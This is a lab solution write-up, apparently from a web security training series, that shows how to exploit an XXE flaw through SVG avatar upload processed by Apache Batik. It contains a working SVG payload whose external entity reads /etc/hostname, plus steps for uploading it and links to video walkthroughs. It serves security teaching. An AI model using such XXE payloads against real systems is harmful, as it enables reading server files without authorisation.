# Lab 8: Exploiting XXE via image file upload

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

## Solution
> Manual Exploitation
1. Create a local SVG image with the following content:
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
2. Post a comment on a blog post, and upload this image as an avatar.
3. When you view your comment, you should see the contents of the /etc/hostname file in your image. Use the "Submit solution" button to submit the value of the server hostname.

## Video Solution
- [Sommer's Video](https://youtu.be/Ycv9_LpJPjo)
- [Seven Seas Security's Video](https://youtu.be/12gXUitWyU4)
